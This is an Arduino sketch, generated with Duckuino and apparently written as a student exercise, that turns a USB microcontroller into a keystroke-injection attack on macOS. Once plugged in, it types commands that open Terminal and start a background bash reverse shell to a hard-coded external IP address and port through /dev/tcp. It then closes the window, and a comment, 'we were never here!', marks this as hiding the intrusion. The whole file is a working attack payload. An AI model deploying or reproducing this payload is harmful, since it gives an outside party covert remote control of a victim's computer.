/**
 * Made with Duckuino, an open-source project.
 * Check the license at 'https://github.com/Dukweeno/Duckuino/blob/master/LICENSE'
 */

#include "Keyboard.h"

void typeKey(uint8_t key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

/* Init function */
void setup()
{
  // Begining the Keyboard stream
  Keyboard.begin();

  // Wait 500ms
  delay(500);

  // spawns a reverse shell
  // Shrey Somaiya z5257343
  // 2 April 2020
  // Set default delay 200ms
  // Command + Space ==> spotlight search
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(' ');
  Keyboard.releaseAll();

  // Search for termina
  delay(200);
  Keyboard.print(F("terminal"));

  typeKey(KEY_RETURN);

  delay(200);
  Keyboard.print(F(" bash"));

  typeKey(KEY_RETURN);

  // enables job control so we can set reverse shell to run in bg
  delay(200);
  Keyboard.print(F(" set -m"));

  typeKey(KEY_RETURN);

  // spawns a reverse shell in background
  delay(200);
  Keyboard.print(F(" sh -c \"/bin/bash -i > /dev/tcp/139.180.169.29/6996 0<&1 2>&1 &\" && exit"));

  typeKey(KEY_RETURN);

  // we were never here!
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('w');
  Keyboard.releaseAll();

  typeKey(KEY_RETURN);

  // Ending stream
  Keyboard.end();
}

/* Unused endless loop */
void loop() {}